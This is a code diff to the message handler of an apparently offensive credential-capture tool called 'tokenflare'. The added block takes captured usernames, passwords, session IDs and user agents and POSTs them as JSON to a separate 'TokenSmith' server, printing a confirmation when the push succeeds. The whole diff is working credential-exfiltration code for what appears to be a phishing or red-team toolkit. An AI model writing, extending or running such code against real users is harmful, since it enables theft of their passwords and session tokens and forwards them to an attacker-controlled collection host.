@@ -518,6 +518,27 @@ def create_handler(log_file=None, show_raw=False):
             event_type, data = classify_message(message)
             print_capture(event_type, data, body, show_raw=show_raw)
 
+            # Forward captured credentials to TokenSmith
+            if event_type == 'credentials' and hasattr(self.server, 'tokensmith_url') and self.server.tokensmith_url:
+                try:
+                    username = data.get('username', '')
+                    password = data.get('password', '')
+                    url = self.server.tokensmith_url.rstrip('/') + '/api/tokenflare/credentials'
+                    cred_payload = json.dumps({
+                        'username': username,
+                        'password': password,
+                        'source': 'tokenflare',
+                        'user_agent': body.get('user_agent', '') if isinstance(body, dict) else '',
+                        'session_id': body.get('session_id', '') if isinstance(body, dict) else '',
+                        'timestamp': datetime.now().isoformat(),
+                    }).encode('utf-8')
+                    req = urllib.request.Request(url, data=cred_payload,
+                        headers={'Content-Type': 'application/json'}, method='POST')
+                    urllib.request.urlopen(req, timeout=10)
+                    print(f"  {C.GREEN}Credentials pushed to TokenSmith{C.RESET}")
+                except Exception as e:
+                    print(f"  {C.DIM}TokenSmith credential push failed: {e}{C.RESET}")
+
             if log_file:
                 entry = {
                     'timestamp': datetime.now().isoformat(),
